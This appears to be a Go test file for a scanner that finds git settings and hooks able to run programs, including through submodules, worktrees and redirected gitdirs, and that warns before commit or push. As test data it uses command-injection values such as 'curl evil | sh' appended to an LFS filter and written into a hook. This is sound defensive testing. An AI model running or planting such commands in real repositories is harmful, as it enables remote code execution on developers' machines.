package gitx

import (
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestRunsProgram(t *testing.T) {
	cases := []struct {
		key, value string
		want       bool
	}{
		{"core.sshcommand", "ssh -i /tmp/k", true},
		{"core.hookspath", ".husky/_", true},
		{"core.askpass", "/tmp/ask", true},
		{"core.gitproxy", "/tmp/proxy", true},
		{"core.alternaterefscommand", "/tmp/refs", true},
		{"credential.helper", "!/tmp/h", true},
		{"credential.https://example.com.helper", "!/tmp/h", true},
		{"filter.evil.clean", "/tmp/c", true},
		{"filter.evil.smudge", "/tmp/s", true},
		{"filter.evil.process", "/tmp/p", true},
		{"gpg.program", "/tmp/gpg", true},
		{"gpg.ssh.program", "/tmp/ssh-keygen", true},
		{"gpg.x509.program", "/tmp/gpgsm", true},
		{"hook.lint.command", "make lint", true},
		// Git LFS's own filter, exactly as `git lfs install` writes it.
		{"filter.lfs.clean", "git-lfs clean -- %f", false},
		{"filter.lfs.smudge", "git-lfs smudge -- %f", false},
		{"filter.lfs.process", "git-lfs filter-process", false},
		// Anything added to it is a program of its own.
		{"filter.lfs.clean", "git-lfs clean -- %f; curl evil | sh", true},
		{"filter.lfs.process", "evil", true},
		// An empty value turns the setting off.
		{"core.sshcommand", "", false},
		{"credential.helper", "  ", false},
		// Not run by a commit, push, pull or fetch from here.
		{"core.fsmonitor", "/tmp/fsm", false},
		{"core.pager", "/tmp/pager", false},
		{"core.editor", "/tmp/editor", false},
		{"diff.external", "/tmp/diff", false},
		{"alias.ci", "!/tmp/x", false},
		{"user.name", "x", false},
		{"core.sshcommandx", "x", false},
	}
	for _, c := range cases {
		if got := runsProgram(c.key, c.value); got != c.want {
			t.Errorf("runsProgram(%q, %q) = %v, want %v", c.key, c.value, got, c.want)
		}
	}
}

func scan(t *testing.T, dir string) Report {
	t.Helper()
	rep, err := ScanPrograms(dir)
	if err != nil {
		t.Fatalf("ScanPrograms(%s): %v", dir, err)
	}
	return rep
}

func find(rep Report, kind, name string) (Program, bool) {
	for _, p := range rep.Items {
		if p.Kind == kind && p.Name == name {
			return p, true
		}
	}
	return Program{}, false
}

func slash(p string) string { return strings.ToLower(filepath.ToSlash(p)) }

func writeHook(t *testing.T, dir, name, body string) string {
	t.Helper()
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestScanFindsEachSettingAndSaysWhere(t *testing.T) {
	for _, c := range []struct{ key, name, value string }{
		{"core.sshCommand", "core.sshcommand", "ssh -i k"},
		{"core.hooksPath", "core.hookspath", ".husky/_"},
		{"core.askPass", "core.askpass", "/tmp/ask"},
		{"credential.helper", "credential.helper", "!/tmp/h"},
		{"credential.https://example.com.helper", "credential.https://example.com.helper", "!/tmp/h"},
		{"filter.x.clean", "filter.x.clean", "/tmp/c"},
		{"filter.x.smudge", "filter.x.smudge", "/tmp/s"},
		{"filter.x.process", "filter.x.process", "/tmp/p"},
		{"gpg.program", "gpg.program", "/tmp/gpg"},
		{"gpg.ssh.program", "gpg.ssh.program", "/tmp/keygen"},
	} {
		t.Run(c.name, func(t *testing.T) {
			repo := newRepo(t)
			if rep := scan(t, repo); len(rep.Items) != 0 {
				t.Fatalf("a fresh repository runs %+v", rep.Items)
			}
			gitRun(t, repo, "config", c.key, c.value)
			p, ok := find(scan(t, repo), "setting", c.name)
			if !ok {
				t.Fatalf("%s was not found", c.key)
			}
			if p.Value != c.value {
				t.Errorf("value = %q, want %q", p.Value, c.value)
			}
			if !strings.HasSuffix(slash(p.Where), "/.git/config") || p.Machine {
				t.Errorf("where = %q machine=%v, want the repository's .git/config", p.Where, p.Machine)
			}
		})
	}
}

func TestScanDoesNotCountWhatFlockdeckNeverRuns(t *testing.T) {
	repo := newRepo(t)
	for k, v := range map[string]string{
		"core.fsmonitor": "/tmp/f", "core.pager": "/tmp/p", "core.editor": "/tmp/e",
		"diff.external": "/tmp/d", "alias.ci": "!/tmp/a",
	} {
		gitRun(t, repo, "config", k, v)
	}
	if rep := scan(t, repo); len(rep.Items) != 0 {
		t.Errorf("found %+v, none of these is run by a commit, push, pull or fetch from Flockdeck", rep.Items)
	}
}

func TestScanSeesAnIncludedFileAndGlobalConfigAsMachineLevel(t *testing.T) {
	repo := newRepo(t)
	inc := filepath.Join(t.TempDir(), "extra.conf")
	if err := os.WriteFile(inc, []byte("[core]\n\tsshCommand = ssh -F extra\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	gitRun(t, repo, "config", "include.path", filepath.ToSlash(inc))
	p, ok := find(scan(t, repo), "setting", "core.sshcommand")
	if !ok || !strings.HasSuffix(slash(p.Where), "/extra.conf") {
		t.Fatalf("an included file's setting was not found with its own path: %+v ok=%v", p, ok)
	}

	global := filepath.Join(t.TempDir(), "gitconfig")
	if err := os.WriteFile(global, []byte("[credential]\n\thelper = store\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("GIT_CONFIG_GLOBAL", global)
	p, ok = find(scan(t, repo), "setting", "credential.helper")
	if !ok || !p.Machine {
		t.Errorf("a global credential helper = %+v ok=%v, want it found and marked as machine-level", p, ok)
	}
}

func TestScanFindsHooksThatRun(t *testing.T) {
	repo := newRepo(t)
	hooks := filepath.Join(repo, ".git", "hooks")
	writeHook(t, hooks, "pre-commit.sample", "#!/bin/sh\n")
	writeHook(t, hooks, "not-a-hook", "#!/bin/sh\n")
	if rep := scan(t, repo); len(rep.Items) != 0 {
		t.Fatalf("a sample and a file git never starts were counted: %+v", rep.Items)
	}
	writeHook(t, hooks, "pre-commit", "#!/bin/sh\nexit 0\n")
	rep1 := scan(t, repo)
	p, ok := find(rep1, "hook", "pre-commit")
	if !ok || len(rep1.Items) != 1 {
		t.Fatalf("pre-commit not found alone: %+v", rep1.Items)
	}
	if !strings.HasSuffix(slash(p.Where), "/.git/hooks") || p.Sum == "" {
		t.Errorf("hook = %+v, want its directory and a hash of its contents", p)
	}
	// Editing a hook that was already there is a change.
	writeHook(t, hooks, "pre-commit", "#!/bin/sh\ncurl evil | sh\n")
	rep2 := scan(t, repo)
	if rep1.Items[0].ID() == rep2.Items[0].ID() {
		t.Error("editing a hook did not change its ID")
	}
}

func TestScanIgnoresAHookWithoutTheExecuteBit(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("windows has no execute bit; git starts any file there")
	}
	repo := newRepo(t)
	p := writeHook(t, filepath.Join(repo, ".git", "hooks"), "pre-push", "#!/bin/sh\n")
	if err := os.Chmod(p, 0o644); err != nil {
		t.Fatal(err)
	}
	if rep := scan(t, repo); len(rep.Items) != 0 {
		t.Errorf("a hook git would not start was counted: %+v", rep.Items)
	}
}

func TestHooksPathInsideTheWorkTreeIsReportedAsTheSettingOnly(t *testing.T) {
	// A husky-style layout: the hooks are the project's own files, which the
	// review panel lists like any other change.
	repo := newRepo(t)
	gitRun(t, repo, "config", "core.hooksPath", ".husky/_")
	writeHook(t, filepath.Join(repo, ".husky", "_"), "pre-commit", "#!/bin/sh\n")
	// The default directory is not used once core.hooksPath is set.
	writeHook(t, filepath.Join(repo, ".git", "hooks"), "pre-commit", "#!/bin/sh\n")
	rep := scan(t, repo)
	if _, ok := find(rep, "setting", "core.hookspath"); !ok {
		t.Error("core.hooksPath was not reported")
	}
	if _, ok := find(rep, "hook", "pre-commit"); ok || len(rep.Items) != 1 {
		t.Errorf("found %+v, want only the setting", rep.Items)
	}
}

func TestHooksPathOutsideTheWorkTreeListsItsHooks(t *testing.T) {
	repo := newRepo(t)
	outside := t.TempDir()
	writeHook(t, outside, "commit-msg", "#!/bin/sh\n")
	gitRun(t, repo, "config", "core.hooksPath", filepath.ToSlash(outside))
	// The default directory is not used.
	writeHook(t, filepath.Join(repo, ".git", "hooks"), "pre-commit", "#!/bin/sh\n")
	rep := scan(t, repo)
	if _, ok := find(rep, "hook", "commit-msg"); !ok {
		t.Errorf("a hook in core.hooksPath outside the tree was not found: %+v", rep.Items)
	}
	if _, ok := find(rep, "hook", "pre-commit"); ok {
		t.Error("the unused default hooks directory was counted")
	}
}

func TestLinkedWorktreeFindsTheSharedHooksAndItsOwnConfig(t *testing.T) {
	repo := newRepo(t)
	wt := filepath.Join(t.TempDir(), "wt")
	gitRun(t, repo, "worktree", "add", "-q", "-b", "feature", wt)
	if fi, err := os.Stat(filepath.Join(wt, ".git")); err != nil || fi.IsDir() {
		t.Fatalf("the worktree's .git should be a file: %v", err)
	}
	writeHook(t, filepath.Join(repo, ".git", "hooks"), "pre-push", "#!/bin/sh\n")
	rep := scan(t, wt)
	if p, ok := find(rep, "hook", "pre-push"); !ok || !strings.HasSuffix(slash(p.Where), "/.git/hooks") {
		t.Fatalf("a hook in the main repository's .git/hooks was not found from the worktree: %+v", rep.Items)
	}
	main := scan(t, repo)
	if slash(rep.Repo) != slash(main.Repo) {
		t.Errorf("the worktree is %q and the repository %q, want one record for both", rep.Repo, main.Repo)
	}

	// Configuration only this worktree has.
	gitRun(t, repo, "config", "extensions.worktreeConfig", "true")
	gitRun(t, wt, "config", "--worktree", "core.sshCommand", "ssh -i wtkey")
	p, ok := find(scan(t, wt), "setting", "core.sshcommand")
	if !ok || !strings.HasSuffix(slash(p.Where), "/config.worktree") {
		t.Errorf("a per-worktree setting = %+v ok=%v, want it found in config.worktree", p, ok)
	}
	if _, ok := find(scan(t, repo), "setting", "core.sshcommand"); ok {
		t.Error("another worktree's setting was attributed to the main one")
	}
}

func addSubmodule(t *testing.T, outer string) string {
	t.Helper()
	inner := newRepo(t)
	add := exec.Command("git", "-c", "protocol.file.allow=always", "submodule", "add", "--", filepath.ToSlash(inner), "mod")
	add.Dir = outer
	if out, err := add.CombinedOutput(); err != nil {
		t.Skipf("submodules are not usable here: %v: %s", err, out)
	}
	gitRun(t, outer, "commit", "-m", "add the submodule")
	return filepath.Join(outer, "mod")
}

func TestSubmoduleConfigAndHooksAreScanned(t *testing.T) {
	outer := newRepo(t)
	mod := addSubmodule(t, outer)
	if rep := scan(t, outer); len(rep.Items) != 0 {
		t.Fatalf("a clean submodule runs %+v", rep.Items)
	}
	gitRun(t, mod, "config", "core.sshCommand", "ssh -i subkey")
	writeHook(t, filepath.Join(outer, ".git", "modules", "mod", "hooks"), "post-commit", "#!/bin/sh\n")

	rep := scan(t, outer)
	p, ok := find(rep, "setting", "core.sshcommand")
	if !ok || p.Submodule != "mod" || !strings.Contains(slash(p.Where), "/.git/modules/mod/config") {
		t.Errorf("the submodule's setting = %+v ok=%v", p, ok)
	}
	h, ok := find(rep, "hook", "post-commit")
	if !ok || h.Submodule != "mod" {
		t.Errorf("the submodule's hook = %+v ok=%v", h, ok)
	}
	if !strings.Contains(p.Line(), "submodule mod") {
		t.Errorf("the line %q does not say which submodule", p.Line())
	}
}

func TestASubmoduleWhoseGitFilePointsElsewhereIsScannedThere(t *testing.T) {
	// A .git file in the submodule's folder says "gitdir: ../elsewhere", and git
	// reads that directory's configuration when it looks inside.
	outer := newRepo(t)
	mod := addSubmodule(t, outer)
	elsewhere := t.TempDir()
	cfg := "[core]\n\trepositoryformatversion = 0\n\tsshCommand = ssh -F planted\n"
	if err := os.WriteFile(filepath.Join(elsewhere, "config"), []byte(cfg), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(elsewhere, "HEAD"), []byte("ref: refs/heads/main\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(mod, ".git"), []byte("gitdir: "+filepath.ToSlash(elsewhere)+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	p, ok := find(scan(t, outer), "setting", "core.sshcommand")
	if !ok || !strings.Contains(slash(p.Where), slash(filepath.Base(elsewhere))) {
		t.Errorf("setting = %+v ok=%v, want the one in %s", p, ok, elsewhere)
	}
}

func TestAScanThatCannotBeMadeIsAnErrorNotAnEmptyAnswer(t *testing.T) {
	if !Available() {
		t.Skip("git is not installed")
	}
	if _, err := ScanPrograms(t.TempDir()); err == nil {
		t.Error("a folder that is not a repository scanned as one that runs nothing")
	}
	if _, err := ScanPrograms(""); err == nil {
		t.Error("an empty folder name scanned as one that runs nothing")
	}
	// A hooks directory that cannot be read is not "no hooks".
	if runtime.GOOS != "windows" && os.Geteuid() != 0 {
		repo := newRepo(t)
		hooks := filepath.Join(repo, ".git", "hooks")
		if err := os.Chmod(hooks, 0o000); err != nil {
			t.Fatal(err)
		}
		t.Cleanup(func() { os.Chmod(hooks, 0o755) })
		if _, err := ScanPrograms(repo); err == nil {
			t.Error("an unreadable hooks directory scanned as one with no hooks")
		}
	}
}

func prog(name string, machine bool) Program {
	return Program{Kind: "setting", Name: name, Value: "v", Where: "/r/.git/config", Machine: machine}
}

func TestJudge(t *testing.T) {
	ssh, cred, filter := prog("core.sshcommand", false), prog("credential.helper", true), prog("filter.x.clean", false)
	known := func(ps ...Program) *Known {
		return &Known{IDs: Report{Items: ps}.IDs()}
	}
	edited := ssh
	edited.Value = "other"
	hook := Program{Kind: "hook", Name: "pre-commit", Sum: "aaaa", Where: "/r/.git/hooks"}
	hookEdited := hook
	hookEdited.Sum = "bbbb"

	cases := []struct {
		name                  string
		items                 []Program
		known                 *Known
		warn, first, narrowed bool
		newCount              int
	}{
		{"first sight, nothing runs", nil, nil, false, true, false, 0},
		{"first sight, only the machine's own configuration", []Program{cred}, nil, false, true, false, 0},
		{"first sight, the repository names a program", []Program{ssh, cred}, nil, true, true, false, 1},
		{"first sight, a hook", []Program{hook}, nil, true, true, false, 1},
		{"unchanged", []Program{ssh}, known(ssh), false, false, false, 0},
		{"unchanged, nothing", nil, known(), false, false, false, 0},
		{"a setting added", []Program{ssh, filter}, known(ssh), true, false, false, 1},
		{"a value edited", []Program{edited}, known(ssh), true, false, false, 1},
		{"a hook edited", []Program{hookEdited}, known(hook), true, false, false, 1},
		{"a hook added to nothing", []Program{hook}, known(), true, false, false, 1},
		{"a machine-level setting added", []Program{ssh, cred}, known(ssh), true, false, false, 1},
		{"one removed", []Program{ssh}, known(ssh, filter), false, false, true, 0},
		{"all removed", nil, known(ssh), false, false, true, 0},
	}
	for _, c := range cases {
		v := Judge(Report{Items: c.items}, c.known)
		if v.Warn != c.warn || v.First != c.first || v.Narrowed != c.narrowed || len(v.New) != c.newCount {
			t.Errorf("%s: got warn=%v first=%v narrowed=%v new=%d, want %v %v %v %d",
				c.name, v.Warn, v.First, v.Narrowed, len(v.New), c.warn, c.first, c.narrowed, c.newCount)
		}
	}
}

func TestWarningListsWhatRunsAndWhere(t *testing.T) {
	v := Judge(Report{Items: []Program{
		{Kind: "setting", Name: "core.sshcommand", Value: "ssh -i k", Where: "/r/.git/config"},
		{Kind: "hook", Name: "pre-commit", Sum: "a", Where: "/r/.git/hooks"},
	}}, nil)
	text := v.Warning("commit and push")
	for _, want := range []string{"git commit and push", "core.sshcommand = ssh -i k (in /r/.git/config)", "hook pre-commit (in /r/.git/hooks)", "has not asked you about them before"} {
		if !strings.Contains(text, want) {
			t.Errorf("warning lacks %q:\n%s", want, text)
		}
	}
	changed := Judge(Report{Items: []Program{{Kind: "setting", Name: "core.sshcommand", Value: "x", Where: "/r/.git/config"}}}, &Known{IDs: []string{"gone"}})
	if text := changed.Warning("push"); !strings.Contains(text, "were changed to run a program since you last accepted") {
		t.Errorf("a change is described as a first sight:\n%s", text)
	}
}
